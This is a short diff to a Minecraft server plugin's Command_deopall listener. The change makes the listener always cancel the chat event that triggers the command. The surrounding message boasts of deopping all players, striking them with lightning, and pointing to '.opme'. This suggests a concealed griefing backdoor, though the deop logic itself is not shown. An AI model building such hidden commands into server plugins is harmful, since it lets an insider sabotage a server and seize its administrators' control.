@@ -51,9 +51,9 @@ public class Command_deopall implements Listener
                         }
                     }
                     p.sendMessage(ChatColor.DARK_RED + "Mwaaahahahahaha... All players deopped (and striked with lightning :) heheh) You were striked and deopped too, use .opme!");
-                    event.setCancelled(true);
-                    return;
                 }
+                event.setCancelled(true);
+                return;
             }
         }
     }
